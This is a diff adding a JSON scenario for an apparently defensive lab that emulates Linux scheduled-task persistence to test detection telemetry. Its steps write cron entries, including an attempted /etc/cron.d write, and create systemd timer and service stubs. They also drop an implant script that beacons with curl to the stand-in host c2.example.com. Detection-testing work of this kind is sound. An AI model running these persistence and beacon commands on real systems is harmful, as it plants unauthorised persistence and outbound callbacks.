@@ -1,0 +1,51 @@
+{
+  "scenario_id": "sched_persist_001",
+  "name": "Scheduled Task Persistence — Cron, At, Systemd Timer Stubs",
+  "class_name": "persistence",
+  "mode": "lab_only",
+  "risk_level": "critical",
+  "hosts": ["workstation-1"],
+  "preconditions": ["telemetry collector active"],
+  "behavior_profile": {
+    "sched_persist": true,
+    "cleanup": true
+  },
+  "custom_behaviors": {
+    "sched_persist": [
+      {"step_id": "cron_user_write", "command": "mkdir -p /tmp/ClawdianShield && echo '*/5 * * * * /bin/sh /tmp/ClawdianShield/implant.sh > /dev/null 2>&1' > /tmp/ClawdianShield/crontab_payload.txt"},
+      {"step_id": "cron_system_write", "command": "echo '*/15 * * * * root /tmp/ClawdianShield/implant.sh' > /tmp/ClawdianShield/etc_cron_stub.txt && cp /tmp/ClawdianShield/etc_cron_stub.txt /etc/cron.d/clawdian_stub 2>/dev/null || cp /tmp/ClawdianShield/etc_cron_stub.txt /tmp/ClawdianShield/etc_crond_written.txt"},
+      {"step_id": "write_implant", "command": "printf '#!/bin/sh\\ncurl -s http://c2.example.com/beacon || true\\n' > /tmp/ClawdianShield/implant.sh && chmod 755 /tmp/ClawdianShield/implant.sh"},
+      {"step_id": "at_stub", "command": "echo 'sh /tmp/ClawdianShield/implant.sh' > /tmp/ClawdianShield/at_job.txt"},
+      {"step_id": "systemd_timer_stub", "command": "mkdir -p /tmp/ClawdianShield/systemd && printf '[Unit]\\nDescription=Clawdian Persistence Stub\\n\\n[Timer]\\nOnBootSec=60s\\nOnUnitActiveSec=5m\\n\\n[Install]\\nWantedBy=timers.target\\n' > /tmp/ClawdianShield/systemd/clawdian.timer && printf '[Unit]\\nDescription=Clawdian Service Stub\\n\\n[Service]\\nExecStart=/tmp/ClawdianShield/implant.sh\\n' > /tmp/ClawdianShield/systemd/clawdian.service"},
+      {"step_id": "verify_artifacts", "command": "ls -la /tmp/ClawdianShield/crontab_payload.txt /tmp/ClawdianShield/implant.sh /tmp/ClawdianShield/systemd/clawdian.timer > /tmp/ClawdianShield/persist_receipt.txt 2>&1"}
+    ]
+  },
+  "custom_behavior_techniques": {
+    "sched_persist": "T1053.003"
+  },
+  "custom_behavior_produces": {
+    "sched_persist": ["file_events", "hash_deltas", "process_events"]
+  },
+  "expected_telemetry": {
+    "file_events": true,
+    "hash_deltas": true,
+    "process_events": true
+  },
+  "detections_expected": [
+    "cron_stub_written",
+    "systemd_timer_created",
+    "implant_script_dropped",
+    "persistence_path_write_detected"
+  ],
+  "success_criteria": [
+    "/etc/cron.d/ write or stub file_create detected",
+    "systemd .timer and .service files generate file_events",
+    "implant.sh chmod +x produces process + file events"
+  ],
+  "safety_constraints": {
+    "lab_environment_only": true,
+    "no_real_exploit_logic": true,
+    "no_real_credential_attack_logic": true,
+    "no_unapproved_network_spread": true
+  }
+}
